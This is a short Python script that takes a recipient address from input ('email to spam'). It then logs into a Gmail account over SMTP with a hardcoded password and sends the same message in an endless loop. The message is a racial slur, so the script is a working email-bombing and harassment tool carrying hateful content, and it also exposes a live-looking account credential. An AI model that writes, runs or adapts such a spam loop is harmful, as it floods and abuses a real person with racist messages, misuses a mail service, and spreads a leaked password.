import smtplib

#info
print("--------------------------")
password = "gfnaoaftdbdwmydy"
message = "nigger"

rec = input("email to spam: ")




while True:
    s = smtplib.SMTP("smtp.gmail.com", 587)
    s.starttls()
    s.login("savvythepig@gmail.com", password)
    s.sendmail("savvythepig@gmail.com", rec, message)
    print("success")
